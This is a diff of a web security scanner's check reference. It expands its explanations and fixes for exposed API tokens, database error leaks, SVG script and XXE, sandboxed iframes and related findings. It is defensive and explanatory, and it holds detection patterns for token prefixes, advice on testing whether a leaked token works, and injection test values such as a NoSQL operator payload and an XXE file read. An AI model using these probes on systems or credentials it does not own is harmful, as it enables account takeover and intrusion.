 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Rotate API key immediately.
+- Delete the key under Settings, API Keys. It stops working at once.
+- Review the Activity feed for mail sent during the exposure.
+- Create a replacement restricted to Mail Send, and keep it on the server.
 - **Rotate exposed SendGrid API key** (bash):
 ```bash
 # Revoke at: app.sendgrid.com > Settings > API Keys
@@ -9031,11 +9110,11 @@ Slack webhook URL found in source.
 ### `github-token-exposed` [content / critical / body-pattern]
 **GitHub Token Pattern Detected**
 
-GitHub personal access token found.
+The response contains a GitHub token in a recognized format: classic personal access token (ghp_), fine-grained token (github_pat_) or OAuth token (gho_).
 
-**Risk:** Repository access, code manipulation.
+**Risk:** The token acts as the person or app that created it. A classic token with repo scope reaches every private repository that account can see, and with workflow scope it can change CI, which is how a leaked token turns into stolen deployment secrets or a poisoned release.
 
-**Why it matters:** GitHub tokens grant repo access.
+**Why it matters:** To confirm it is live, call GET https://api.github.com/user with the token: a 200 means it works, and the X-OAuth-Scopes response header lists what a classic token can do. GitHub's secret scanning revokes tokens it finds in public repositories, but it does not see your website, so a token in a page can stay valid indefinitely. Tokens land in pages when front-end code calls the GitHub API directly. The right shape is a server route that holds the token and makes the call.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -9043,7 +9122,10 @@ GitHub personal access token found.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Revoke token immediately, use fine-grained tokens.
+- Revoke the token in GitHub's Developer settings, or in the organization's token list for a fine-grained token.
+- Review the audit log for clones, new deploy keys, new workflow files and pushes made while it was exposed.
+- Rotate any repository or organization secrets the token could read through CI.
+- Replace it with a fine-grained token scoped to specific repositories with an expiry, or the Actions GITHUB_TOKEN.
 - **Revoke exposed GitHub token immediately** (bash):
 ```bash
 # Revoke at: github.com/settings/tokens
@@ -9055,14 +9137,14 @@ curl -H "Authorization: token TOKEN" https://api.github.com/users/OWNER/events
 # Or use GitHub Actions GITHUB_TOKEN (auto-scoped, expires after run)
 ```
 
-### `google-api-key-exposed` [content / medium / body-pattern]
+### `google-api-key-exposed` [content / low / body-pattern]
 **Google API Key Exposed**
 
-Google API key found in source.
+A Google API key (AIza...) appears in the page. Maps JavaScript API keys are embedded in pages by design, so the question is whether this key is restricted.
 
-**Risk:** Quota theft, billing abuse.
+**Risk:** An unrestricted key can be used from any site or script against every API enabled on the project, and the usage is billed to you. A key restricted by HTTP referrer and API is much less useful to anyone else.
 
-**Why it matters:** Unrestricted Google keys can be abused.
+**Why it matters:** A key in a page is not a leak by itself when it is a Maps or Firebase web key: browser keys are public and are protected by the restrictions set in the Cloud console. To test, call an enabled API with the key using curl and no referrer. If that works, the key is unrestricted. A key used for server-side APIs should never be in a page at all.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -9070,7 +9152,10 @@ Google API key found in source.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Restrict key to specific APIs and referrers.
+- In the Google Cloud console under APIs and Services, Credentials, restrict the key by HTTP referrer to your own domains.
+- Restrict the key to the specific APIs the page uses.
+- Set per-API quotas and a billing alert.
+- Use a separate key, restricted by IP address, for server-side calls.
 - **Restrict Google API key by referrer and API scope** (bash):
 ```bash
 # Restrict in Google Cloud Console > APIs & Services > Credentials
@@ -9088,9 +9173,9 @@ gcloud services api-keys update KEY_ID \
 
 Mailchimp API key pattern found.
 
-**Risk:** Email list access, campaign manipulation.
+**Risk:** A Mailchimp key can export every audience with its personal data, or send a campaign to your whole list from your own address.
 
-**Why it matters:** Mailchimp keys grant full account access.
+**Why it matters:** The suffix after the dash is the data center, so the key tells an attacker which API host to call. An export of the list is a personal data breach under GDPR and similar laws if it holds EU subscribers, so check the account's export and API activity for the period the key was exposed, and involve whoever owns privacy if you find any.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -9098,7 +9183,9 @@ Mailchimp API key pattern found.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Regenerate API key immediately.
+- Generate a new key and disable the old one in Account, Extras, API keys.
+- Review recent exports and campaigns for activity you did not start.
+- Call Mailchimp from your backend only, so the key never reaches a browser.
 - **Rotate exposed Mailchimp API key** (bash):
 ```bash
 # Revoke at: Mailchimp Account > Extras > API Keys
@@ -9114,9 +9201,9 @@ Mailchimp API key pattern found.
 
 Heroku API key pattern found.
 
-**Risk:** Full Heroku account control.
+**Risk:** The key acts as the owning account on every app it can access: it can read config vars, deploy new code, scale dynos and delete apps.
 
-**Why it matters:** Heroku keys allow app deployment and deletion.
+**Why it matters:** Most Heroku apps keep DATABASE_URL and other secrets in config vars, and the Platform API returns those to anyone holding this key, so a leaked key is also a leak of each secret in each app. Heroku's key is a bare UUID, which this check only matches when the words heroku and api key sit close to it.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -9124,7 +9211,10 @@ Heroku API key pattern found.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Regenerate API key immediately.
+- Regenerate the key in Heroku's account settings. The old one stops working at once.
+- Assume every config var on every app was read: rotate database credentials and third-party keys.
+- Check heroku releases on each app for deployments you did not make.
+- Use scoped authorization tokens from heroku authorizations:create instead of the account key.
 - **Revoke exposed Heroku API key** (bash):
 ```bash
 # Revoke at: dashboard.heroku.com > Account Settings > API Key > Reveal + Regenerate
@@ -9142,9 +9232,9 @@ heroku auth:logout
 
 NPM authentication token found.
 
-**Risk:** Package publishing, supply chain attack.
+**Risk:** A token with write access can publish new versions of every package it covers, which runs the attacker's code on every machine that upgrades.
 
-**Why it matters:** NPM tokens allow package publishing.
+**Why it matters:** Install scripts run at npm install, and that is how worms have moved through the registry. Check the version history on npm for releases you did not make, and deprecate or unpublish those at once. Granular tokens limited to one package with an expiry reduce the damage, and trusted publishing from CI removes the token entirely.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -9152,7 +9242,9 @@ NPM authentication token found.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Revoke token, publish with 2FA.
+- Revoke the token on npmjs.com under Access Tokens, or with npm token revoke.
+- Review every package the token could publish for versions you did not release.
+- Replace it with a granular token or trusted publishing, and require 2FA for publishing.
 - **Revoke exposed npm token** (bash):
 ```bash
 # List tokens:
@@ -9172,11 +9264,11 @@ npm view your-package versions --json
 ### `docker-hub-token-exposed` [content / high / body-pattern]
 **Docker Hub Token Exposed**
 
-Docker Hub credentials found.
+The response contains a Docker Hub access token, either personal (dckr_pat_) or organization (dckr_oat_).
 
-**Risk:** Container image manipulation.
+**Risk:** A token with write permission can push to any repository it reaches, so an attacker can replace the image behind a tag your servers or customers already pull, and whatever deploys from that tag then runs their code. Even a read-only token exposes private images, which often contain source code and baked-in secrets.
 
-**Why it matters:** Docker tokens allow image push/pull.
+**Why it matters:** Docker tags are mutable: pushing to :latest or :1.2 leaves the name unchanged, so nothing downstream notices. To check for damage, compare each recent tag's digest in Docker Hub with the digest your CI build logged. These tokens usually leak through a CI script or a config.json published with the site. docker login -p is how they end up in shell history and process listings, which is why the example below reads the token from stdin.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
@@ -9184,14 +9276,18 @@ Docker Hub credentials found.
 - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
 
 **Fix:**
-- Regenerate token immediately.
+- Delete the token in Docker Hub's account settings. It stops working at once.
+- Compare every tag's digest with what CI built, and rebuild and push anything that does not match.
+- Issue a replacement with the narrowest permission that works, read-only for jobs that only pull.
+- In CI, read the token from a secret and log in with --password-stdin.
+- Pin production images by digest (image@sha256:...) so a pushed tag cannot change what you deploy.
 - **Revoke exposed Docker Hub token** (bash):
 ```bash
 # Revoke at: hub.docker.com > Account Settings > Security > Access Tokens
 # Create a new token with minimum required permissions (Read-only for pull)
 
-# In CI: use DOCKER_HUB_TOKEN as a secret env var
-docker login -u "$DOCKER_HUB_USER" -p "$DOCKER_HUB_TOKEN"
+# In CI: keep DOCKER_HUB_TOKEN as a secret env var, and pass it on stdin
+printf '%s' "$DOCKER_HUB_TOKEN" | docker login -u "$DOCKER_HUB_USER" --password-stdin
 
 # For private registries, consider ECR or GHCR with OIDC (no long-lived tokens)
 ```
@@ -9203,7 +9299,7 @@ A raw PHP, .NET, Django, MySQL, or PostgreSQL error message was found in the res
 
 **Risk:** Reveals internal file paths, stack traces, and technology details that help an attacker map the application; when the error is database-related it can also reveal schema details.
 
-**Why it matters:** Uncaught framework exceptions and raw database errors expose internal implementation details that should never reach an end user.
+**Why it matters:** Uncaught framework exceptions and raw database errors should never reach an end user. SQL syntax errors are especially informative, because they confirm that a parameter reached the query unescaped, which is where an attacker starts. To confirm, load the URL in a private window and see whether the message still appears.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -9211,7 +9307,9 @@ A raw PHP, .NET, Django, MySQL, or PostgreSQL error message was found in the res
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Use custom error pages, log errors server-side.
+- Turn off error display in production: display_errors=Off in PHP, DEBUG=False in Django, custom errors on in ASP.NET.
+- Return a generic error page and log the details on the server with a request ID.
+- If a SQL error came from a parameter, treat that route as a possible injection point and test it.
 - **Return generic errors to clients** (typescript):
 ```typescript
 try {
@@ -9232,9 +9330,9 @@ try {
 
 NoSQL/MongoDB error found in response.
 
-**Risk:** Reveals database type and query structure.
+**Risk:** The message reveals the database type and the shape of the query that failed, which tells an attacker what to try next.
 
-**Why it matters:** NoSQL errors aid injection attacks.
+**Why it matters:** Mongo errors describe the failed operation. E11000 names the index and the duplicate value, and Cast to ObjectId failed shows a field and type, which means an unexpected value reached Mongoose unchecked. An error triggered by a strange value is often the first sign of a NoSQL injection point, so test that route with a value like { "$ne": null } on a system you own.
 
 **References:**
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
@@ -9242,7 +9340,9 @@ NoSQL/MongoDB error found in response.
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Use custom error pages, handle errors gracefully.
+- Catch database errors and return a generic message, logging the details on the server.
+- Validate the type of each field before it reaches the query.
+- Test the route that produced this error for operator injection.
 - **Catch and mask NoSQL errors** (typescript):
 ```typescript
 try {
@@ -9458,18 +9558,20 @@ Sandboxed iframe with allow-scripts.
 ### `svg-script-injection` [content / high / body-pattern]
 **SVG with Script Content**
 
-SVG containing script elements.
+An inline <svg> element in the page contains a <script> element.
 
-**Risk:** If exploited, this finding exposes the target to category-specific risks under content. Severity reflects the realistic worst-case impact under default configurations.
+**Risk:** Script inside an SVG runs with the full privileges of the page it is embedded in. If the SVG came from a user upload or a third party, that is stored XSS: session theft, account changes, whatever the page can do.
 
-**Why it matters:** SVG can contain executable JavaScript.
+**Why it matters:** Browsers execute SVG scripts when the SVG is inlined in HTML or opened directly at its own URL, and not when it is loaded through <img> or CSS. Uploaded files served from your main domain are the common trap, because opening the file's URL runs the script in your origin.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
 
 **Fix:**
-- Sanitize SVG uploads, use CSP.
+- Sanitize SVG uploads and remove script elements before storing them, for example with DOMPurify's SVG profile.
+- Serve user uploads from a separate domain with Content-Disposition: attachment where possible.
+- Use a CSP that blocks inline script.
 - **Block SVG script execution and sanitize SVG content** (typescript):
 ```typescript
 import DOMPurify from "dompurify";
@@ -9489,16 +9591,18 @@ const cleanSvg = DOMPurify.sanitize(userSvg, {
 
 Script tag using data: URI source.
 
-**Risk:** Inline script execution via data URI.
+**Risk:** The script runs in your page with no URL that a host allowlist could inspect, so it slips past filters and leaves little trace in network logs.
 
-**Why it matters:** data: URIs can embed script content.
+**Why it matters:** A build rarely emits this, so if you did not put it there, decode it and read what it does: injected card skimmers use this form too. A CSP should not include data: in script-src, since that permits any payload an attacker can place.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
 
 **Fix:**
-- Block data: in CSP script-src.
+- Decode the script and work out where it came from.
+- Move legitimate code into a file served from your own origin.
+- Leave data: out of script-src in your Content-Security-Policy.
 - **Block data: URI script execution via CSP** (typescript):
 ```typescript
 // Add to Content-Security-Policy:
@@ -9619,17 +9723,19 @@ Password field with type=hidden.
 ### `password-visible-default` [content / high / body-pattern]
 **Password Field Type is Text**
 
-Password stored in text input instead of password type.
+An input whose name or id contains password uses type="text", so what is typed is shown on screen.
 
-**Risk:** Password visible on screen.
+**Risk:** The password can be seen by anyone nearby and captured by screen recording or session-replay tools. Browsers also keep text fields for form autofill and do not treat the value as a password.
 
-**Why it matters:** Password fields should mask input.
+**Why it matters:** A show-password toggle is fine: the field starts as type="password" and flips only when the user asks. The issue is a field that starts visible. The check matches on the name or id, so a field such as password_hint fires as well, and it is worth checking what the field really holds.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
 
 **Fix:**
-- Use type='password' for password inputs.
+- Use type="password" for password inputs.
+- If you offer a reveal button, start hidden and switch only on request.
+- Exclude the field from any session-replay tool.
 - **Default password fields to type="password" (hidden)** (html):
 ```html
 <!-- Password fields must default to hidden (type="password") -->
@@ -9806,14 +9912,18 @@ export async function POST(req: Request) {
 
 A <form action="javascript:..."> executes JavaScript on submit and is a classic XSS vector if the action is partially attacker-controlled.
 
-**Risk:** Replace action="javascript:..." with action="/endpoint" and handle submit via JS or server
+**Risk:** Submitting the form runs script in your origin. If any part of the action value comes from user data, that is XSS triggered by one click, and the payload needs no angle brackets.
+
+**Why it matters:** A form that submits to a javascript: URL does nothing without script and also needs 'unsafe-inline' in a CSP, so it stands in the way of a strict policy. Giving the form a real endpoint and attaching a submit listener keeps it working if script fails to load.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
 
 **Fix:**
-- Replace action="javascript:..." with action="/endpoint" and handle submit via JS or server
+- Replace action="javascript:..." with a real endpoint.
+- Handle submission from a listener in an external script.
+- Reject javascript: wherever an action or URL value is built from data.
 - **Never use javascript: in form action** (html):
 ```html
 <!-- BAD: form action with javascript: scheme executes arbitrary JS -->
@@ -9861,16 +9971,20 @@ export async function POST(req: Request) {
 ### `iframe-allow-scripts-allow-same-origin` [content / high / body-pattern]
 **Sandboxed iframe allows both scripts and same-origin**
 
-Combining sandbox='allow-scripts allow-same-origin' removes most of the sandbox protection and lets the iframe access the parent origin.
+An iframe sets sandbox with both allow-scripts and allow-same-origin. This is only an escape when the framed document has the same origin as the page embedding it.
 
-**Risk:** Drop allow-same-origin (or allow-scripts) - together they fully re-enable same-origin script execution
+**Risk:** A same-origin framed document can reach up into the embedding page's DOM, remove the sandbox attribute from its own iframe and reload with no restriction at all. The sandbox then protects nothing, and user-supplied content in the frame runs as your site.
+
+**Why it matters:** The escape needs both flags and a same-origin document: a same-origin or relative src, or srcdoc. A cross-origin iframe with both flags keeps the browser's cross-origin boundary, and that combination is the documented embed for many widgets, Discord's among them. For content generated from user input, render it on a separate origin or drop allow-same-origin so that it gets an opaque origin.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/1021.html
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Drop allow-same-origin (or allow-scripts) - together they fully re-enable same-origin script execution
+- If the frame shows user-generated or third-party content on your own origin, drop allow-same-origin.
+- Better still, serve that content from a separate domain so same-origin can never apply.
+- Keep both flags only for a cross-origin embed that needs them, such as a vendor widget.
 - **Avoid combining allow-scripts and allow-same-origin in sandbox** (html):
 ```html
 <!-- DANGEROUS: combining these two effectively removes sandbox protection -->
@@ -9887,14 +10001,18 @@ Combining sandbox='allow-scripts allow-same-origin' removes most of the sandbox 
 
 An <svg onload="..."> attribute fires JavaScript when the SVG renders and is equivalent to inline script for XSS purposes.
 
-**Risk:** Move event handlers to addEventListener in external JS; sanitize SVG uploads
+**Risk:** The handler runs as soon as the SVG renders, with no click needed, in the page's origin. Attackers favor <svg onload> because it is short and gets past filters that look only for <script>.
+
+**Why it matters:** If your own team wrote the SVG this is a CSP and hygiene issue. If it was uploaded or contains user text, it is stored XSS. onload fires when the SVG is inlined in HTML or opened as a document, and not when it is referenced from an <img> tag.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
 
 **Fix:**
-- Move event handlers to addEventListener in external JS; sanitize SVG uploads
+- Move event handlers to addEventListener in external JavaScript.
+- Sanitize SVG uploads so that handlers are removed before storage.
+- Serve user-supplied SVG through <img> or from a separate domain.
 - **Strip onload and event handlers from SVG before rendering** (typescript):
 ```typescript
 import DOMPurify from "dompurify";
@@ -9913,14 +10031,18 @@ document.getElementById("svg-container")!.innerHTML = cleanSvg;
 
 An <svg> with an external entity reference like <!ENTITY xxe SYSTEM "file:///..."> can leak local files when the SVG is rendered server-side.
 
-**Risk:** Strip DOCTYPE and external entities when ingesting SVG; use a hardened parser
+**Risk:** If a server-side XML parser processes this SVG with entity expansion on, it can read local files such as /etc/passwd into the image or make requests to internal hosts. A converter that renders it to PNG then hands the file contents back as a picture.
+
+**Why it matters:** Browsers do not load external entities in SVG, so the risk is on the server: image converters, PDF generators and thumbnailers that accept SVG uploads. Seeing the declaration in a page means someone saved one, possibly on purpose as a probe, so find out who and check your logs for the upload.
 
 **References:**
 - https://cwe.mitre.org/data/definitions/611.html
 - https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
 
 **Fix:**
-- Strip DOCTYPE and external entities when ingesting SVG; use a hardened parser
+- Strip DOCTYPE and entity declarations when ingesting SVG.
+- Configure the parser to disable external entities and DTD loading.
+- Run image conversion in a sandbox with no network or filesystem access to anything sensitive.
 - **Disable external entity references in SVG parsing** (typescript):
 ```typescript
 // When parsing SVG server-side, disable external references
@@ -9988,19 +10110,19 @@ A form action attribute uses plain HTTP, or points to a domain that is neither y
 ### `base-tag` [content / medium / body-pattern]
 **Base tag with insecure or dynamic href**
 
-The HTML base element sets the base URL for all relative links. A user-controlled or HTTP base tag enables base tag hijacking attacks.
+The page has a <base> element and no base-uri restriction was found. A cross-origin or plain HTTP href redirects every relative URL on the page.
 
-**Risk:** An attacker who can inject a base tag pointing to their server can redirect all relative resource requests, loading attacker-controlled scripts, images, and forms while keeping the original domain in the address bar.
+**Risk:** A <base> pointing at another origin or at HTTP sends relative scripts, images and form submissions there while the original domain stays in the address bar. A same-origin value such as <base href="/"> is normal for app shells and carries no such risk.
 
-**Why it matters:** The base tag should be set to a fixed HTTPS absolute URL and never derived from user input.
+**Why it matters:** A base tag that already exists adds no hijack risk by itself, since an injected <base> placed before it would win either way. What matters is the value: resolve it against the page URL and check that it stays on your own origin over HTTPS, and that it is never derived from user input. A base-uri directive in your CSP stops an injected <base> from taking effect.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base
 
 **Fix:**
-- Set base href to an absolute HTTPS URL you control
-- Never derive the base href from query parameters or cookies
-- Validate base tag values as part of your template security review
+- Keep the base href on your own origin over HTTPS.
+- Never derive the base href from query parameters or cookies.
+- Add base-uri 'self' to your Content-Security-Policy.
 - **Remove or restrict base tag** (html):
 ```html
 <!-- Risky: dynamic base tag can redirect all relative URLs -->
@@ -10281,7 +10403,7 @@ Laravel's APP_DEBUG=true is enabled in production, showing detailed error pages 
 
 **Risk:** Laravel debug mode exposes full stack traces, local variables, all configuration values (including database credentials if they appear in traces), and can allow code execution via the Ignition debug interface on older versions.
 
-**Why it matters:** APP_DEBUG must be false in production environments.
+**Why it matters:** The Whoops or Ignition page prints source around the failing line, the full stack and, in many versions, request data and environment values. Ignition before 2.5.2 with debug on also had CVE-2021-3129, unauthenticated remote code execution. To confirm, open the URL without logging in. Because configuration shows on this page, rotate APP_KEY and any credential visible in it, knowing that rotating APP_KEY invalidates encrypted cookies.
 
 **References:**
 - https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
@@ -10360,27 +10482,26 @@ document.querySelector('#find-me').addEventListener('click', () => {
 ```
 
 ### `clipboard-access` [content / low / body-pattern]
-**Clipboard API Referenced**
+**Page Script Reads the Clipboard**
 
-The page references navigator.clipboard or document.execCommand('copy'). This check only detects the API reference; it does not verify whether the call is gated behind user interaction. The single most common use of this API is a benign "copy to clipboard" button.
+A script on the page calls navigator.clipboard.read(), navigator.clipboard.readText() or document.execCommand('paste'). A copy button only writes to the clipboard and is not what this check is about.
 
-**Risk:** If genuinely ungated, reading the clipboard without user intent violates privacy since it may contain passwords, 2FA codes, or other sensitive data. Manually confirm the call site before treating this as a gesture-gating issue.
+**Risk:** The clipboard can hold passwords, 2FA codes or other data copied from other apps. A read that is not tied to something the user asked for exposes all of that to the page.
 
-**Why it matters:** Clipboard read/write must be triggered by user gesture and clearly communicate why it needs clipboard access.
+**Why it matters:** Browsers gate clipboard reads behind a user gesture, a permission prompt or a paste confirmation, depending on the browser. A paste-from-clipboard button is a normal feature, so confirm that the call runs from a click and that the page says why it wants access.
 
 **References:**
 - https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API
 
 **Fix:**
-- Only call navigator.clipboard.readText() in response to an explicit user gesture
-- Explain to users why clipboard access is needed
-- Prefer clipboard.write() over read() where possible
-- **Request clipboard access with user gesture** (javascript):
+- Only call navigator.clipboard.readText() in response to an explicit user gesture.
+- Explain to users why clipboard access is needed.
+- If the page only needs to copy, use writeText() and remove the read call.
+- **Read the clipboard only from a user gesture** (javascript):
 ```javascript
-// Always request clipboard inside a user gesture handler
-document.querySelector('#copy-btn').addEventListener('click', async () => {
+document.querySelector('#paste-btn').addEventListener('click', async () => {
   try {
-    await navigator.clipboard.writeText(text);
+    input.value = await navigator.clipboard.readText();
   } catch (err) {
     console.warn('Clipboard access denied:', err);
   }
@@ -10418,11 +10539,11 @@ stream.getTracks().forEach(track => track.stop());
 ### `html-injection-patterns` [content / high / body-pattern]
 **HTML injection pattern detected**
 
-User-controlled input appears to be reflected in the HTML response without proper encoding, enabling HTML injection.
+The response contains markup shaped like an injection payload: a <script> straight after </title>, or an <img> whose onerror handler runs payload-style code such as alert(), eval() or a cookie read.
 
-**Risk:** HTML injection allows attackers to insert arbitrary HTML content into the page: creating fake login forms (phishing), modifying page appearance, injecting links, or redirecting users, and may escalate to XSS if script tags can be injected.
+**Risk:** If a visitor can put that markup in the page, they control what the page does: fake login forms, altered content, or script running in your origin. The scanner sees one response, so it cannot tell who wrote the markup.
 
-**Why it matters:** All user-controlled values that appear in HTML output must be HTML-encoded to prevent injection.
+**Why it matters:** A harmless onerror that hides a broken image is not reported. To confirm a hit, find where the matching text comes from: a value from the URL, a form or stored user content that reaches the page without HTML encoding is the bug, and markup your own templates produced is not. All user-controlled values in HTML output have to be encoded for that context.
 
 **References:**
 - https://owasp.org/www-community/attacks/xss/
@@ -10640,12 +10761,12 @@ const pool = new Pool({ connectionString: 'postgresql://user:pass@host/db' });
 const pool = new Pool({ connectionString: process.env.DATABASE_URL });
 ```
 
-### `source-code-comment` [content / medium / body-pattern]
+### `source-code-comment` [content / info / body-pattern]
 **Sensitive source code comment in response**
 
-An HTML comment in the response contains potentially sensitive information such as file paths, credentials, or developer notes.
+An HTML comment in the response contains a developer note: TODO, FIXME, XXX, HACK, a console.log call or the word debugger.
 
-**Risk:** HTML comments are visible to anyone who views source, revealing internal paths, developer notes about security weaknesses, API endpoints, or occasionally credentials that were left during development.
+**Risk:** HTML comments are visible to anyone who views source. A note on its own is untidy rather than dangerous, but it can point at unfinished or weak parts of the app. A comment that holds a credential is reported separately as sensitive-comments.
 
 **Why it matters:** Production HTML responses should not contain developer comments.
 
@@ -18842,6 +18963,8 @@ Stripe whsec_* values must live server-side. If they show up in client code, att
 
 **Risk:** An attacker with the webhook signing secret can forge any Stripe event: payments.succeeded, invoice.paid, subscription.deleted, causing your server to credit fraudulent orders, cancel real subscriptions, or trigger payouts without any actual transaction.
 
+**Why it matters:** The signing secret is what proves a webhook came from Stripe: your endpoint recomputes an HMAC over the raw body and compares the result. Anyone holding it can sign their own events, so the check passes and your handler marks an unpaid order as paid. Only the server ever verifies this signature, so a copy in a client bundle usually means a NEXT_PUBLIC_ style prefix or a shared config object.
+
 **References:**
 - https://stripe.com/docs/webhooks/signatures
 - https://cwe.mitre.org/data/definitions/798.html
@@ -19012,6 +19135,8 @@ AWS secret access keys (40-char base64) must never be in client code or public b
 
 **Risk:** An exposed AWS Secret Access Key paired with an Access Key ID gives attackers full programmatic access to your AWS account at the permissions level of that IAM user: this can mean reading S3 buckets, spinning up EC2 instances, creating new IAM users, or incurring six-figure compute bills before you notice.
 
+**Why it matters:** This is the half that signs requests. The 40-character secret is never sent to AWS: Signature Version 4 uses it to compute a signature, so nothing in AWS shows that it was copied, and CloudTrail records the access key ID only once someone uses the pair. See also aws-credentials-exposed for the full response when a pair is exposed, and secret-aws-access-key-id for the identifier on its own.
+
 **References:**
 - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html
 - https://cwe.mitre.org/data/definitions/798.html
@@ -19050,6 +19175,8 @@ const s3 = new S3Client({ region: 'us-east-1' });
 ghp_* / gho_* / ghu_* / ghs_* / ghr_* tokens grant repo / user access.
 
 **Risk:** A leaked GitHub PAT gives an attacker access to every repository and organization the token owner can reach, including private repos, source code, CI/CD secrets, and deployment keys. Fine-grained tokens are scoped, but classic PATs are often overprivileged.
+
+**Why it matters:** The prefix says what kind of token this is and who can revoke it. ghp_ is a personal access token, gho_ an OAuth app token, ghu_ a GitHub App user token, ghr_ a refresh token, and ghs_ a GitHub App installation token, which expires within an hour. A ghs_ value may already be dead by the time you read this. See also github-token-exposed for confirming a token is live and cleaning up after it.
 
 **References:**
 - https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens
@@ -19136,6 +19263,8 @@ jobs:
 pypi-AgEIcHlwaS... tokens allow uploading packages.
 
 **Risk:** An exposed PyPI token allows an attacker to upload a malicious version of any Python package associated with the token, injecting arbitrary code into the install process for every user that runs pip install on that package.
+
+**Why it matters:** An account-wide PyPI token can upload a new release of every project you maintain, and a malicious release runs code at install time through setup.py or at import time afterwards, on each machine that upgrades. Check each project's release history for versions you did not publish. Trusted Publishing removes the token from the process, since the CI job gets a short-lived credential through OIDC.
 
 **References:**
 - https://pypi.org/help/#apitoken
@@ -19306,6 +19435,8 @@ PD keys grant incident / on-call rotation control.
 
 **Risk:** An exposed PagerDuty API key lets an attacker silence real incidents, reassign on-call rotations, acknowledge alerts automatically, and query your team structure, potentially hiding a real security breach by suppressing the alerts that would trigger a response.
 
+**Why it matters:** A monitoring credential is unusually useful after a breach, because it controls whether anyone gets woken up. With this key an attacker can resolve the alert that would have exposed them, change an escalation policy, or read on-call schedules and phone numbers for social engineering. Check the audit records for maintenance windows and schedule changes you did not make.
+
 **References:**
 - https://developer.pagerduty.com/api-reference/
 - https://cwe.mitre.org/data/definitions/798.html
@@ -19394,6 +19525,8 @@ hf_* tokens grant model / dataset upload access.
 
 **Risk:** An exposed HuggingFace write token lets an attacker upload malicious model weights or datasets under your account identity, a supply-chain attack that affects anyone who downloads and runs those models, potentially including your own users.
 
+**Why it matters:** A write token can push to every model and dataset the account owns. Model files are not inert: pickle-based weights such as PyTorch .bin files can run code when loaded, so a swapped file executes on whichever machine pulls it next. Review the commit history of each repository on the account, since every push appears there, and prefer safetensors for anything you publish or consume.
+
 **References:**
 - https://huggingface.co/docs/hub/security-tokens
 - https://cwe.mitre.org/data/definitions/798.html
@@ -19420,6 +19553,8 @@ client = InferenceClient(
 Pinecone keys grant vector-DB control.
 
 **Risk:** An exposed Pinecone API key grants full control over your vector database: an attacker can delete all vectors (destroying your semantic search), upsert poisoned embeddings, query all indexed data, or create new indexes at your expense.
+
+**Why it matters:** Vector stores often hold embeddings of private documents, with the text chunks stored beside them as metadata, so a read is a data leak and not only a cost problem. Writes are subtler: poisoned vectors change what a RAG application retrieves and can feed attacker-written instructions into your model's context. Unless the key was created with restricted permissions, it reaches every index in the project.
 
 **References:**
 - https://docs.pinecone.io/guides/operations/security
@@ -19518,6 +19653,8 @@ AKIA* keys are not secrets by themselves but pair with secret keys.
 
 **Risk:** An exposed AWS Access Key ID is a partial credential. It is harmless without the matching secret key. However, its exposure signals that secret keys may also be present in the same codebase, and the Key ID is needed to rotate or audit usage even after compromise.
 
+**Why it matters:** The AKIA string is an identifier, comparable to a username: it appears in CloudTrail and cannot sign anything by itself. It still tells an attacker which account it belongs to, because sts get-access-key-info returns the account ID for a key ID. If the secret is in the same response this is the lesser finding. See also aws-credentials-exposed for what to do then, and secret-aws-secret-key for why the other half matters.
+
 **References:**
 - https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html
 - https://cwe.mitre.org/data/definitions/798.html
@@ -19552,6 +19689,8 @@ const db = new DynamoDBClient({ region: 'us-east-1' });
 -----BEGIN ... PRIVATE KEY----- blocks grant signing/decryption access.
 
